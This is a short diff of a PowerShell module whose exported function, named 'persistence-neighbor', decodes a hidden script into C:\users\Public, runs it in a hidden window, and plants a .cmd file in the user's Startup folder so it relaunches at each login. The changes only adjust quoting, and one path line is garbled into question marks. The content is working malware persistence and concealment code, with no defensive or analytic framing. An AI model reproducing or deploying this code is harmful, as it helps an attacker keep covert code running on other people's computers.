@@ -510,11 +510,11 @@ certutil -decode "C:\users\Public\P3RNB.bin" "C:\users\Public\WidgetGuard.ps1" |
 sleep(0.3)
 del "C:\users\Public\P3RNB.bin" -force
 clear;cd C:\users\Public\
-start-process powershell ".\WidgetGuard.ps1 $target $mamba" -windowstyle hidden
+start-process powershell '.\WidgetGuard.ps1 $target $mamba' -windowstyle hidden
 sleep(3.0)
 $target = $process
 $mamba = $naughty
-new-item -ItemType file "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd"  -value "start-process powershell 'C:\Users\Public\WidgetGuard.ps1 $($target) `"$($mamba)`"' -windowstyle hidden" 
+new-item -ItemType file "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0p.cmd"  -value "powershell 'C:\Users\Public\WidgetGuard.ps1 $($target) `"$($mamba)`"' -windowstyle hidden" 
 cd $env:??e????f???
 }
 Export-ModuleMember -Function persistence-neighbor
